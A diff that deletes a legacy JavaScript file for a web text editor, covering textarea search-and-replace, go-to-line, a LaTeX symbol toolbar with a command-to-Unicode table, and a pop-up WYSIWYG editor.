@@ -1,1031 +1,1 @@
-/************************************************************************** 
-* (C) Copyright 2004-2014 by Systems on Web, Inc.  All Rights Reserved.  *
-* Author: Zhongyan Lin                                                   *
-**************************************************************************/
-var numf = 0;
-var textareatobesearch = null; 
-var oldtextareatobesearch = null; 
-var foundat = -1; 
-var targetstr = "";
-var foundstring = "";
-function tolinefeed(str1)
-{
- if (str1==null) return null;
- return str1.replace(/([^\\])\\t/g,"$1\t").replace(/([^\\])\\n/g,"$1\n").replace(/\\\\t/g,"\\t").replace(/\\\\n/g,"\\n").replace(/^\\t/,"\t").replace(/^\\n/,"\n");
-}
-function replacestrintextarea(str1)
-{
- str1 = tolinefeed(str1); 
- if (textareatobesearch == null) return;
- if (navigator.appName=='Microsoft Internet Explorer')
- {
- var tas =  document.selection.createRange();
- var oldtxt = tas.text;
- if (oldtxt.length > 0)
- {
- tas.text = str1;//replace(targetstr,str1);
- numf--;
- findstrintextarea(targetstr);
- }
- }
- else if (foundat > -1)
- {
- var txt = textareatobesearch.value;
- textareatobesearch.value = txt.substring(0,foundat)
- + txt.substring(foundat).replace(foundstring, str1);
- foundat += str1.length - 1;
- findstrintextarea(targetstr); 
- }
-}
-
-function replacestrintextareareg(str1)
-{
- str1 = tolinefeed(str1);
- var tas =  document.selection.createRange();
- var oldtxt = tas.text;
- if (oldtxt.length > 0)
- {
- //tas.text = str1;
- tas.text = replace(targetstr,str1);
- numf--;
- findstrintextarea(targetstr);
- } 
-} 
-function findstrintextarea(str) 
-{
- 
- targetstr = str;
- if (textareatobesearch == null || str==null || str =='') return false;
- textareatobesearch.focus();
- var found = false; 
- if (navigator.appName=='Microsoft Internet Explorer') 
- {
- var text = textareatobesearch.createTextRange(); 
- for(var i=0; i<=numf && (found=text.findText(str)) != false; i++) 
- {
- text.moveStart('character', 1);
- text.moveEnd('textedit');
- }
- if(found) 
- {
- text.moveStart('character', -1);
- text.findText( str);
- text.select();
- text.scrollIntoView();
- numf++; 
- return true;
- }
- else
- {
- numf=0; 
- }
- return false;
- }
- else
- {
- if (oldtextareatobesearch != textareatobesearch) foundat = -1;
- oldtextareatobesearch = textareatobesearch;
- var txt = textareatobesearch.value;
- 
- var foundstr = txt.substring(foundat+1).match(new RegExp(str));
- if (foundstr !=null)
- {
- foundstring = "" + foundstr;
- 
- var j = txt.substring(foundat+1).indexOf(foundstring);
- foundat = j + foundat + 1;
- var linenum = 0, k=0;
- while (k <= foundat){  if (txt.charAt(k)=='\n') linenum++; k++;}
- 
- var fnt = 15;
- if (typeof(font_size)!='undefined')
- fnt = font_size;
- if (typeof(document.f1)!='undefined' && typeof(document.f1.linenum)!='undefined')
- document.f1.linenum.value = linenum;
-
- textareatobesearch.scrollTop = (linenum*fnt);
- textareatobesearch.selectionStart = foundat;
- textareatobesearch.selectionEnd = foundat + foundstring.length;
- textareatobesearch.scrollIntoView();
- }
- else
- {
- textareatobesearch.selectionStart = 0;
- textareatobesearch.selectionEnd = 0;
- foundat = -1;
- }
- return (foundat > -1);
- }
-}
-var secondtextarea = null;
-var secondnumf = 0;
-var secondfoundat = -1;
-function swap(source_a)
-{
- if (textareatobesearch != source_a)
- {
- secondtextarea = textareatobesearch;
- var tmp = numf;
- numf = secondnumf;
- secondnumf = tmp;
- textareatobesearch = source_a;
- tmp = foundat;
- foundat = secondfoundat;
- secondfoundat = tmp;
- 
- }
-} 
- 
-function findstrintextarea2(sourcea,Patternt)
-{
-  
- if (Patternt==null)
- {
-     if (typeof(fsnd)!='undefined') 
-         Patternt = fsnd.Pattern;
-     else
-     {
-         var fms = document.forms;
-         var yy = false;
-         for (var j=0; j < fms.length; j++)
-         {
-             var xs = fms[j].elements;
-             for (var i=0; i < xs.length; i++)
-             {
-                 if (xs[i].name == 'Pattern')
-                 {
-                     Patternt= xs[i];
-                     yy = true;
-                     break;
-                 }  
-             }
-             if (yy) break;
-         }
-     }
- } 
- if (sourcea==null)
- {
-     myprompt('source null'); 
-     return;
- }
- swap(sourcea);
- findstrintextarea(Patternt.value);
-}
- 
-function replacestrintextarea2(source_a, NewString_t)
-{
- if (source_a==null){myprompt('source null'); return;}
- swap(source_a);
- replacestrintextarea(NewString_t.value);
-}
-
-function searchreplacewin(ta)
-{
- textareatobesearch = ta;
- var nav = window.open("","searchwin","location=0;toolboar=0,menubar=0,top=0,left=300,width=260,height=130");
- nav.document.getElementsByTagName("body")[0].innerHTML = "";
- nav.document.write("<html><head><meta http-equiv=\"content-type\" content=\"text/html; charset=" + encoding +"\"></head><body bgcolor=lighyellow><form name=f><table>"
-+"<tr><td><input name=old value=D></td><td>"
-+"<input type=button name=findbtn  style=width:60 value=Next onclick=opener.findstrintextarea(document.f.old.value)>"
-+"</td></tr><tr><td><input name=newone></td><td>"
-+"<input type=button name=replacebtn style=width:60 value=Replace onclick=opener.replacestrintextarea(document.f.newone.value)>"
-+"<table></form></body></html>");
-}
-
-function go2line(v)
-{
-
- var j=0, i = parseInt(v);
- if ('' + i == 'NaN')
- {
- myprompt(v + ":" + textmsg[245]);
- return;
- }
- var txt = textareatobesearch.value;
- var N = txt.length;
- var ii= i;
- for (; i > 1 && j < N; j++)
- {
- if (txt.charAt(j) == '\n')
- i--;
- }
-
- if (i > 1)
- {
- myprompt('No such a line');
- return;
- }
- var k = j+1;
- for (; k < N && txt.charAt(k) != '\n';
- k++);
- 
- 
- if(textareatobesearch.setSelectionRange)
- {
- textareatobesearch.setSelectionRange(j, k);
- textareatobesearch.focus();
- var fnt = 15;
- if (typeof(font_size)!='undefined')
- fnt = font_size;
- textareatobesearch.scrollTop = (ii*fnt);
- }
- else
- {
- var r = textareatobesearch.createTextRange();
- r.collapse(true);
- r.moveStart('character', j-ii +1);
- r.moveEnd('character', k-j);
- r.select();
- r.scrollIntoView();
- }
-
-}
-
-var holdtoolbartable = '';
-var holdtoolbartablelength = 0;
-var latexhintbar = [
-[0, '<span style=font-size:20px;vertical-align:middle><nobr>a/b</nobr></span>',          'fraction',                   '\\frac{}{}'],
-[1, '<table  border=0 cellpadding=0 cellspacing=0  width=25 ><tr height=12><td rowspan=2 width=15 align=right style=font-size:18px>a</td><td width=10 style=font-size:13px align=left >b</td></tr><tr height=11><td  style=font-size:13px> </td></tr></table>',        'exponential',                '{}^{}'],
-[2, '<span style=font-size:20px;vertical-align:middle>\u03A3</span>',      'summation',                  '\\sum_{}^{}'],
-[3, '<span style=font-size:20px;vertical-align:middle>lim</span>',          'limit',                      '\\lim_{}'],
-[4, '<span style="font-size:20px;width:25px;text-align:center;vertical-align:middle">\u222B</span>',      'indefinite integral',        '\\int' ],
-[5, '<table  border=0 cellpadding=0 cellspacing=0  width=25 ><tr height=10><td rowspan=2 width=12 style=font-size:20px valign=bottom  align=right >\u222B</td><td  width=13  align=left style=font-size:13px  valign=bottom  >x</td></tr><tr  height=10><td wisth=13 align=left style=font-size:13px  valign=middle  >a</td></tr></table>',  'definite integral',          '\\int_{}^{}'],
-[6, '<span style="font-size:20px;width:25px;text-align:center;vertical-align:middle">|m|</span>',          'vertail matrix',             '\\begin{vmatrix}  &  & \\\\ &  & \\end{vmatrix}'],
-[7, '<span style="font-size:20px;width:25px;text-align:center;vertical-align:middle">(m)</span>',          'parenthes matrix',           '\\begin{pmatrix}  &  & \\\\ &  & \\end{pmatrix}'],
-[8, '<span style="font-size:20px;width:25px;text-align:center;vertical-align:middle">equ</span>',          'labeled equation',           '\\begin{equation}   \\end{equation}'],
-[9, '<span style="font-size:20px;width:25px;text-align:center;vertical-align:middle">eqn</span>',          'equation array',             '\\begin{eqnarray}  &=&  \\\\ &=&  \\end{eqnarray}'],
-[10, '<span style="font-size:20px;width:25px;text-align:center;vertical-align:middle">eq*</span>',        'no-label equation array',    '\\begin{eqnarray*}  &=&  \\\\ &=& \\end{eqnarry*}'], 
-[11, '<span style="font-size:20px;width:25px;text-align:center;vertical-align:middle">\u03C0</span>',      'Greek letter pi',        '\\pi' ],
-[12, '<span style="font-size:20px;width:25px;text-align:center;vertical-align:middle">\u03B1</span>',  'Greek letter alpha',          '\\alpha'],
-[13, '<span style="font-size:20px;width:25px;text-align:center;vertical-align:middle">\u03B2</span>',          'Greek letter belta',                   '\\beta'],
-[14, '<span style="font-size:20px;width:25px;text-align:center;vertical-align:middle">\u03B3</span>',        'Greek letter gamma',                '\\gamma'],
-[15, '<span style="font-size:20px;width:25px;text-align:center;vertical-align:middle">\u03B8</span>',      'Greek letter',                  '\\theta'] 
-];
- 
-function showlatexpanel(ta,btn)
-{
-    var tbl0 = document.getElementById('latexbtntbl');
-    if ( tbl0 != null  &&   tbl0.innerHTML.indexOf('insertlatexhints') >= 0 )
-    {
-        tbl0.parentNode.removeChild(tbl0);
-    }
-    if (typeof(hidemyhint) !='undefined') hidemyhint();
-    textareatobesearch = ta;
-    var moholdtoolbartable = '';
-    holdtoolbartable = ''; 
-    var v = document.getElementById("thetoolbar"); //for makeform case
-    var makeformcase = ( v != null && v.tagName.toLowerCase() == 'td');
-    var ll = ((latexhintbar.length + 1)*31 + 4);
-    if (btn == null)makeformcase = true;
-    if (btn!=null && v == null)    
-    { 
-        v =    btn;
-        while (v.tagName.toLowerCase()!='table' && v.tagName.toLowerCase()!='div'){ v = v.parentNode;}
-        v = v.parentNode;
-        if (v.tagName.toLowerCase()=='form')
-        {
-           while (v.tagName.toLowerCase()!='table'){ v = v.parentNode;}
-           v = v.parentNode;
-        }
-        
-        holdtoolbartablelength = v.offsetWidth;
-        holdtoolbartable = v.innerHTML;
-        moholdtoolbartable = v.innerHTML.replace(/<input [^>]+>/ig, '<input type=hidden />').replace(/<table[^>]*>/ig,'').replace(/<tr[^>]*>/ig,'').replace(/<td[^>]*>/ig,'').replace(/<.table[\s]*>/ig,'').replace(/<.tr[\s]*>/ig,'').replace(/<.td[\s]*>/ig,'').replace(/<.?tbody>/ig,'');
-        moholdtoolbartable = ""; 
-    }
-    else if (btn!=null && v.tagName.toLowerCase() == 'table') // this is for moving toolbar case
-    {
-        v = v.parentNode;  //go to td 
-        holdtoolbartable = v.innerHTML;
-        holdtoolbartablelength = v.offsetWidth;
-    }
-    
-    var cellheight = 25;
-    if (btn!=null) cellheight = btn.offsetHeight;
-    var str = '<table id=latexbtntbl cellspacing=1 cellpadding=0 style="layout:fixed;overflow:visible"><tr height=25>';
-     
-    if (btn == null)
-         str += '<td class=outset1 width=25 style="border:1px #333333 outset;width:25px;" align=center  onclick="topdf(\"' + ta.name + '\")">2PDF</td>';
-    else if (makeformcase == false)
-         str += '<td class=outset1 width=25 style="border:1px #333333 outset;width:25px;" align=center  onclick="restoreregulartoolbar(this)"><img src=image/return.png height=20></td>';
-    else
-         str += "<td  class=outset1 style=\"padding:0px 0px 0px 0px;border:1px #333333 outset;width:25px;height:" + btn.offsetHeight + "px;font-size:8px;overflow:hidden\" width=25 align=center> <br><div style=\"font-family:arial;font-size:12px;border:1px #505050 solid;border-radius:3px;width:13px\" onclick=\"closeprompt1(this)\" >x</div></td>";
-     
-    for (var i=0; i <  latexhintbar.length; i++)
-    {
-         str += '<td class=outset1  style="font-size:22px;border:1px #333333 outset;width:25px !important;height:' + cellheight + 'px;overflow:visible;font-size:25px;vertical-align:middle" align=center  valign=middle  onmouseout="hidehint(' + i + ')" onmouseover="showhint(' + i +')" onclick="insertlatexhints(' + i + ')">' + latexhintbar[i][1] + '</td>';
-    }
-     
-    str += '<td class=outset1  style="font-size:15px;border:1px #333333 outset;width:25px !important;height:' + cellheight + 'px;overflow:visible;vertical-align:middle" align=center  valign=middle   onclick=showlatexsymbols()>&bull;&bull;&bull;</td>';
-    str += '<td>' + moholdtoolbartable +'</td></tr></table>';
-
-   
-    if (btn == null || makeformcase == false)
-    {
-        v.style.width = ll + 'px !important';
-        v.innerHTML = str.replace('<table', '<table width=' + ll )  ;
-        v.style.overflow = 'visible';
-        displaylatex(v);
-        v.style.width = ll + 'px !important';
-    }
-    else
-    {
-        if (typeof(findPositionnoScrolling) == 'function'   && typeof(displaylatex) == 'function')
-        { 
-             
-            var xy = findPositionnoScrolling(ta);
-            var promptwin1 = document.createElement('div');
-            promptwin1.id = "latextoolbar";
-            promptwin1.style.cssText = "z-index:20;overflow:visible;position:absolute;border:1px #b0b0b0 outset;padding:0px;top:" + (xy[1]-35) +"px;left:"
-            + (xy[0]+5) +"px;width:" + ll + 'px !important';
-            promptwin1.innerHTML =  str.replace('<table', '<table width=' + ll ) ;
-            document.body.appendChild(promptwin1);
-            var dragcell = promptwin1.getElementsByTagName('table')[0].rows[0].cells[0];
-            if (typeof (Drag)!='undefined')Drag.init(dragcell,promptwin1);
-        }
-    }
-    
-    var tbl = document.getElementById('latexbtntbl');
-    tbl.parentNode.style.width = ll + 'px';
-    for (var k=0; k <= latexhintbar.length; k++)
-        tbl.rows[0].cells[k].width = '30';
-}
-
-function closeprompt1(mg)
-{
-   var v = mg.parentNode;
-   while (v.tagName.toLowerCase() !='div' )  
-      v = v.parentNode;
-   document.body.removeChild(v);
-}
-function showhint(i)
-{
-    window.status = latexhintbar[i][2];
-}
-function hidehint(i)
-{
-    window.status = "";
-}
-
-function restoreregulartoolbar(btn)
-{
-     if (holdtoolbartable=='') return;
-     var v = document.getElementById('latexbtntbl');
-     if (v!=null) 
-     {
-         v = v.parentNode;
-         LaTexHTML.deformat(v);
-         v.innerHTML = holdtoolbartable;
-         holdtoolbartable = '';
-         v.style.width = holdtoolbartablelength  + 'px';
-     }
-}
-
-function insertlatexhints(i)
-{
-    insertstrintotextarea(latexhintbar[i][3]);
-}
- 
-function insertstrintotextarea(myValue)
-{
-var myField = textareatobesearch;
-var j = caretPos(myField), m=j-1;
-var n =0;
-while (m>=0)
-{  
-    if (myField.value.charAt(m) =='$')
-    n++;
-    m--;
-}
-var x = '';
-if (j>0) x = myField.value.substring(0,j);
-if (n % 2 == 0)
-{
-   myField.value =  x + "$" + myValue + "$"  + myField.value.substring(j);
-}
-else
-{
-   myField.value = x +  myValue +  myField.value.substring(j); 
-}
- 
-}
-
-
-var latexsymbols = ["\\alpha","\u03B1",
-"\\beta","\u03B2",
-"\\gamma","\u03B3",
-"\\delta","\u03B4",
-"\\epsilon","\u03B5",
-"\\varepsilon","\u025B",
-"\\zeta","\u03B6",
-"\\eta","\u03B7",
-"\\theta","\u03B8",
-"\\vartheta","\u03D1",
-"\\iota","\u03B9",
-"\\kappa","\u03BA",
-"\\lambda","\u03BB",
-"\\mu","\u03BC",
-"\\nu","\u03BD",
-"\\xi","\u03BE",
-"\\pi","\u03C0",
-"\\varpi","\u03D6",
-"\\rho","\u03C1",
-"\\varrho","\u03F1",
-"\\varsigma","\u03C2",
-"\\sigma","\u03C3",
-"\\tau","\u03C4",
-"\\upsilon","\u03C5",
-"\\phi","\u03C6",
-"\\varphi","\u03D5",
-"\\chi","\u03C7",
-"\\psi","\u03C8",
-"\\omega","\u03C9",
-"\\Gamma","\u0393",
-"\\Delta","\u0394",
-"\\Theta","\u0398",
-"\\Lambda","\u039B",
-"\\Xi","\u039E",
-"\\Pi","\u03A0",
-"\\Sigma","\u03A3",
-"\\Upsilon","\u03A5",
-"\\Phi","\u03A6",
-"\\Psi","\u03A8",
-"\\Omega","\u03A9",
-"\\frac","\\faqc",
-"\\over","\\over",
-"\\half","\\half",
-"\\quarter","\\quarter",
-//fractions
-"\\frac12","\u00BD",
-"\\frac14","\u00BC",
-"\\frac34","\u00BE",
-"\\frac13","\u2153",
-"\\frac23","\u2154",
-"\\frac15","\u2155",
-"\\frac25","\u2156",
-"\\frac35","\u2157",
-"\\frac45","\u2158",
-"\\frac16","\u2159",
-"\\frac56","\u215A",
-"\\frac18","\u215B",
-"\\frac38","\u215C",
-"\\frac58","\u215D",
-"\\frac78","\u215E",
-
-//binary operation symbols
-"\\pm","\u00B1",
-"\\mp","\u2213",
-"\\triangleleft","\u22B2",
-"\\triangleright","\u22B3",
-"\\cdot","\u22C5",
-"\\star","\u22C6",
-"\\ast","\u002A",
-"\\times","\u00D7",
-"\\div","\u00F7",
-"\\circ","\u2218",
-//"\\bullet","\u2219",
-"\\bullet","\u2022",
-"\\oplus","\u2295",
-"\\ominus","\u2296",
-"\\otimes","\u2297",
-"\\bigcirc","\u25CB",
-"\\oslash","\u2298",
-"\\odot","\u2299",
-"\\land","\u2227",
-"\\wedge","\u2227",
-"\\lor","\u2228",
-"\\vee","\u2228",
-"\\cap","\u2229",
-"\\cup","\u222A",
-"\\sqcap","\u2293",
-"\\sqcup","\u2294",
-"\\uplus","\u228E",
-"\\amalg","\u2210",
-"\\bigtriangleup","\u25B3",
-"\\bigtriangledown","\u25BD",
-"\\dag","\u2020",
-"\\dagger","\u2020",
-"\\ddag","\u2021",
-"\\ddagger","\u2021",
-"\\lhd","\u22B2",
-"\\rhd","\u22B3",
-"\\unlhd","\u22B4",
-"\\unrhd","\u22B5",
-
-
-//BIG Operators
-"\\sum","\u2211",
-"\\prod","\u220F",
-"\\bigcap","\u22C2",
-"\\bigcup","\u22C3",
-"\\bigwedge","\u22C0",
-"\\bigvee","\u22C1",
-"\\bigsqcap","\u2A05",
-"\\bigsqcup","\u2A06",
-"\\coprod","\u2210",
-"\\bigoplus","\u2A01",
-"\\bigotimes","\u2A02",
-"\\bigodot","\u2A00",
-"\\biguplus","\u2A04",
-"\\int","\u222B",
-"\\oint","\u222E",
-
-//binary relation symbols
-":=",":=",
-"\\lt","<",
-"\\gt",">",
-"\\ne","\u2260",
-"\\neq","\u2260",
-"\\le","\u2264",
-"\\leq","\u2264",
-"\\leqslant","\u2264",
-"\\ge","\u2265",
-"\\geq","\u2265",
-"\\geqslant","\u2265",
-"\\equiv","\u2261",
-"\\ll","\u226A",
-"\\gg","\u226B",
-"\\doteq","\u2250",
-"\\prec","\u227A",
-"\\succ","\u227B",
-"\\preceq","\u227C",
-"\\succeq","\u227D",
-"\\subset","\u2282",
-"\\supset","\u2283",
-"\\subseteq","\u2286",
-"\\supseteq","\u2287",
-"\\sqsubset","\u228F",
-"\\sqsupset","\u2290",
-"\\sqsubseteq","\u2291",
-"\\sqsupseteq","\u2292",
-"\\sim","\u223C",
-"\\simeq","\u2243",
-"\\approx","\u2248",
-"\\cong","\u2245",
-"\\Join","\u22C8",
-"\\bowtie","\u22C8",
-"\\in","\u2208",
-"\\ni","\u220B",
-"\\owns","\u220B",
-"\\propto","\u221D",
-"\\vdash","\u22A2",
-"\\dashv","\u22A3",
-"\\models","\u22A8",
-"\\perp","\u22A5",
-"\\smile","\u2323",
-"\\frown","\u2322",
-"\\asymp","\u224D",
-"\\notin","\u2209",
-"\\begin{eqnarray}","X",
-"\\begin{array}","X",
-"\\\\","}&{",
-"\\end{eqnarray}","}}",
-"\\end{array}","}}",
-"\\big","1.2"   ,
-"\\Big","1.6"   ,
-"\\bigg","2.2"   ,
-"\\Bigg","2.9"   ,
-"\\large","1.2"   ,
-"\\Large","1.6"   ,
-"\\LARGE","2.2"   ,
-
-"\\left","X",
-"\\right","X",
-"{","{",
-"}","}",
-
- 
-"\\lbrack","",
-"\\{","{"       ,
-"\\lbrace","{"       ,
-"\\langle","\u2329"   ,
-"\\lfloor","\u230A" ,
-"\\lceil","\u2308" ,
-"\\rbrack","]",
-"\\}","}",
-"\\rbrace","}",
-"\\rangle","\u232A",
-"\\rfloor","\u230B",
-"\\rceil","\u2309",
-
-// "|", "\\|", "\\vert" and "\\Vert" modified later: lspace = rspace = 0em
-"|","\u2223" ,
-"\\|","\u2225" ,
-"\\vert","\u2223" ,
-"\\Vert","\u2225" ,
-"\\mid","\u2223" ,
-"\\parallel","\u2225" ,
-"/","/" ,
-"\\backslash","\u2216" ,
-"\\setminus","\\",
-
-//miscellaneous symbols
-"\\!","",
-"\\,","<div style=width:0.167em><!----></div>",
-"\\>","<div style=width:0.222em><!----></div>",
-"\\:","<div style=width:0.222em><!----></div>",
-"\\,","<div style=width:0.278em><!----></div>",
- 
-"\\quad","<div style=width:1em><!----></div>",
-"\\qquad","<div style=width:2em><!----></div>",
-//"{}","\u200B", // zero-width
-"\\prime","\u2032",
-"'","\u02B9",
-"''","\u02BA",
-"'''","\u2034",
-"''''","\u2057",
-"\\ldots","\u2026",
-"\\cdots","\u22EF",
-"\\vdots","\u22EE",
-"\\ddots","\u22F1",
-"\\forall","\u2200",
-"\\exists","\u2203",
-"\\Re","\u211C",
-"\\Im","\u2111",
-"\\aleph","\u2135",
-"\\hbar","\u210F",
-"\\ell","\u2113",
-"\\wp","\u2118",
-"\\emptyset","\u2205",
-"\\infty","\u221E",
-"\\surd","\\sqrt{}",
-"\\partial","\u2202",
-"\\nabla","\u2207",
-"\\triangle","\u25B3",
-"\\therefore","\u2234",
-"\\angle","\u2220",
-"\\diamond","\u22C4",
-"\\Diamond","\u25C7",
-"\\neg","\u00AC",
-"\\lnot","\u00AC",
-"\\bot","\u22A5",
-"\\top","\u22A4",
-"\\square","\u25AB",
-"\\Box","\u25A1",
-"\\wr","\u2240",
-
-//standard functions
-"\\arccos","arccos",
-"\\arcsin","arcsin",
-"\\arctan","arctan",
-"\\arg","arg",
-"\\cos","cos",
-"\\cosh","cosh",
-"\\cot","cot",
-"\\coth","coth",
-"\\csc","csc",
-"\\deg","deg",
-"\\det","det",
-"\\dim","dim",  
-"\\exp","exp",
-"\\gcd","gcd",  
-"\\hom","hom",
-"\\inf","inf",
-"\\ker","ker",
-"\\lg","lg",
-"\\lim","lim",
-"\\liminf","liminf",
-"\\limsup","limsup",
-"\\ln","ln",
-"\\log","log",
-"\\max","max",
-"\\min","min",
-"\\Pr","Pr",
-"\\sec","sec",
-"\\sin","sin",
-"\\sinh","sinh",
-"\\sup","sup",
-"\\tan","tan",
-"\\tanh","tanh",
-"\\gets","\u2190",
-"\\leftarrow","\u2190",
-"\\to","\u2192",
-"\\rightarrow","\u2192",
-"\\leftrightarrow","\u2194",
-"\\uparrow","\u2191",
-"\\downarrow","\u2193",
-"\\updownarrow","\u2195",
-"\\Leftarrow","\u21D0",
-"\\Rightarrow","\u21D2",
-"\\Leftrightarrow","\u21D4",
-"\\iff","~\\Longleftrightarrow~",
-"\\Uparrow","\u21D1",
-"\\Downarrow","\u21D3",
-"\\Updownarrow","\u21D5",
-"\\mapsto","\u21A6",
-"\\longleftarrow","\u2190",
-"\\longrightarrow","\u2192",
-"\\longleftrightarrow","\u2194",
-"\\Longleftarrow","\u21D0",
-"\\Longrightarrow","\u21D2",
-"\\Longleftrightarrow","\u21D4",
-"\\longmapsto","\u21A6",
-"\\acute","\u00B4",
-"\\grave","\u0060",
-"\\breve","\u02D8",
-"\\check","\u02C7",
-"\\dot",".",
-"\\ddot","..",
-"\\mathring","\u00B0",
-"\\vec","\u20D7",
-"\\overrightarrow","\u20D7",
-"\\overleftarrow","\u20D6",
-"\\hat","\u005E",
-"\\widehat","\u0302",
-"\\tilde","~",
-"\\widetilde","\u02DC",
-"\\bar","\u203E",
-"\\overbrace","\u23B4",
-"\\overline","\u00AF",
-"\\underbrace","\u23B5",
-"\\underline","\u00AF",
-"\\sqrt","&radic,",
-"\\section","section",
-"\\chapter","chapter"];
-
-function showlatexsymbols()
-{
-    var n = Math.ceil(latexsymbols.length/16);
-    for (var i=latexsymbols.length;i < n*16;i++)
-        latexsymbols[i] = "";
-    var k = 0;
-    var x = "<table border=1 style=border-collapse:collapse>";
-    for (var i=0; i < n; i++)
-    {
-        x += "<tr><td>"  + latexsymbols[k+1] + "</td><td>"  + latexsymbols[k] + "</td>" + (i==0?("<td rowspan=" + n + " width=5></td>"):"")
-          + "<td>"  + latexsymbols[k+1 + 2*n] + "</td><td>"  + latexsymbols[k + 2*n ] + "</td>" + (i==0?("<td rowspan=" + n + " width=5></td>"):"")
-          + "<td>"  + latexsymbols[k+1 + 4*n] + "</td><td>"  + latexsymbols[k + 4*n] + "</td>" + (i==0?("<td rowspan=" + n + " width=5></td>"):"")
-          + "<td>"  + latexsymbols[k+1 + 6*n] + "</td><td>"  + latexsymbols[k + 6*n] + "</td>" + (i==0?("<td rowspan=" + n + " width=5></td>"):"")
-          + "<td>"  + latexsymbols[k+1 + 8*n] + "</td><td>"  + latexsymbols[k + 8*n] + "</td>" + (i==0?("<td rowspan=" + n + " width=5></td>"):"")
-          + "<td>"  + latexsymbols[k+1 + 10*n] + "</td><td>"  + latexsymbols[k + 10*n] + "</td>" + (i==0?("<td rowspan=" + n + " width=5></td>"):"")
-          + "<td>"  + latexsymbols[k+1 + 12*n] + "</td><td>"  + latexsymbols[k + 12*n] + "</td>" + (i==0?("<td rowspan=" + n + " width=5></td>"):"")
-          + "<td>"  + latexsymbols[k+1 + 14*n] + "</td><td>"  + latexsymbols[k + 14*n] + "</td></tr>";
-          k+= 2;
-    }
-    myprompt(x + "</table>");
-}
-
-
-var activeeditingbox = null;
-var wyswyghead='';
-var wyswygtail=''; 
-function getBounce(t)
-{
-    if (activeeditingbox == null) return;
-    var loct = document.location.toString().split("/");
-    var jj = "/" + loct[loct.length-2];
-    if (jj.replace(/\/[a-z]+/ig,'')!='') jj = '';
-    t = t.replace(/src=(["]?)\.\..\.\..[a-z|A-Z]+.FileOperation\?did=/g, 'src=$1FileOperation?did=');  
-    t = t.replace(/<p>[ |\n|\r|\t]*&nbsp;<.p>/,'').replace(/<td>[ |\n|\r|\t]+/g,'<td>').replace(/<p>[ |\r|\n|\t]*/ig,'').replace(/<\/p>/ig,'<br>');
-    if (activeeditingbox.tagName.toLowerCase() != 'textarea')
-    {
-        if (wyswyghead == '') wyswyghead = '<!DOCTYPE html><!--created by wyswyg tool-->\n<html>\n<body>';
-        if (wyswygtail == '') wyswygtail = '</body></html>';
-    }
-    if (typeof(fields)!='undefined' && typeof(numCols)!='undefined')
-    {
-       
-        for (var j=0; j < numCols && activeeditingbox.name!=fields[j]; j++);
-        if (j < numCols) 
-        {
-            var xt = retrv(counter,j);
-            setv(counter, j, wyswyghead + t.replace(/&mdash;/g,'__') + wyswygtail);
-            if (xt != activeeditingbox.value) 
-                UT(counter,j);
-        }  
-        else
-        {
-            
-            var xt = activeeditingbox.value;
-            activeeditingbox.value = wyswyghead + t.replace(/&mdash;/g,'__') + wyswygtail;
-            if (xt != activeeditingbox.value && typeof(whenwyewygchange)!='undefined')
-            whenwyewygchange(activeeditingbox);
-            
-        }
-    }
-    else
-    {
-        var xt = activeeditingbox.value;
-        
-        if (wyswyghead == '') wyswyghead = '<!DOCTYPE html><!--created by wyswyg tool-->\n<html>\n<body>';
-       
-        activeeditingbox.value = wyswyghead + t.replace(/&mdash;/g,'__') + wyswygtail;
-        if (xt != activeeditingbox.value && typeof(whenwyewygchange)!='undefined')
-        whenwyewygchange(activeeditingbox);
-
-    }
-    
-    if (activeeditingbox.tagName.toLowerCase() == 'textarea' && typeof(edithtml) == 'undefined')
-    {   
-        activeeditingbox = null;
-        var promptwin1 = document.getElementById('myprompt1');
-        document.body.removeChild(promptwin1);
-        //closeprompt();
-    }
-}
-function wyewyg(ta)
-{
-    activeeditingbox = ta; 
-    if (ta.tagName.toLowerCase() == 'textarea')
-    {
-    var w = (activeeditingbox.offsetWidth+ 122);
-    var h = (activeeditingbox.offsetHeight+ 30);
-    
-    if (h < 470) h = 470;
-    if (w < 900) w = 900;
-    if (w > thispagewidth()-28) w = thispagewidth()-28; 
-    }
-    else
-    {
-        w = 900;
-        h = 600;
-        if (w > thispagewidth()-28) w = thispagewidth()-28; 
-    }
-    if (typeof(encoding) == 'undefined')
-    {
-        var x = document.getElementsByTagName('head')[0].innerHTML.toLowerCase();
-        var ii = x.indexOf('charset=');
-        if (ii >0)
-        {
-            var jj = x.indexOf('"',ii+8);
-            encoding = x.substring(ii+8,jj); 
-        }
-        else
-            encoding = "utf-8";
-    }
-     
-    var title = "WYSWYG " + textmsg[1378];
-    if (typeof(fields)!='undefined' && typeof(numCols)!='undefined')
-    {
-        for (var j=0; j < numCols && activeeditingbox.name!=fields[j]; j++);
-        if (j < numCols) title = labels[j];   
-    }
-    var color = null;
-    if (typeof(activeeditingbox.parentNode) != 'undefined')
-       color = activeeditingbox.parentNode.style.backgroundColor;
-    if (color == null || color == '')
-    {
-        if (typeof(DBGCOLOR) != 'undefined')
-            color = DBGCOLOR;
-    }
-     
-    if (color == null || color == '')
-    color = '#149856';
-    
-    myprompt("<iframe  src=\"../ckeditor/_samples/box.jsp?enc=" + encoding + "&ht=" + h + "&color=" + encodeURIComponent(color) + "\" id=editfrm name=popeditor frameborder=0  width=" + w  +  " height=" + h  +" border=0 />",null,null,title, 'myprompt1');   
-    
-}
-var removetagstr;
-function traversalremove(v)
-{
-    var x = v.childNodes;
-    if (x == null || x.length == 0) 
-       removetagstr += x.innerHTML;
-    else
-    {
-       for (var i=0; i < x.length; i++)
-          traversalremove(x[i]);
-    }
-}
-function removetags(t)
-{
-    var v = document.createElement('div');
-    v.innerHTML = t;
-    removetagstr = "";
-    traversalremove(v);
-    return removetagstr;
-}
-function removehtmltags(t)
-{
-    t = removetags(t); 
-    var loct = document.location.toString().split("/");
-    var jj = "/" + loct[loct.length-2];
-    if (jj.replace(/\/[a-z]+/ig,'')!='') jj = '';
-    t = t.replace(/src=(["]?)\.\..\.\..[a-z|A-Z]+.FileOperation\?did=/g, 'src=$1FileOperation?did=');  
-    if (typeof(fields)!='undefined' && typeof(numCols)!='undefined')
-    {
-        for (var j=0; j < numCols && activeeditingbox.name!=fields[j]; j++);
-        if (j < numCols) 
-        {
-            var xt = retrv(counter,j);
-            setv(counter, j, t);
-            if (xt!=t) UT(counter,j);
-        }   
-    }
-    else
-    {  
-       
-        var xt = activeeditingbox.value;
-        activeeditingbox.value = t;
-        if (xt!=t && typeof(whenwyewygchange)!='undefined')
-            whenwyewygchange(activeeditingbox);
-    }
-     
-    activeeditingbox = null;
-}
-
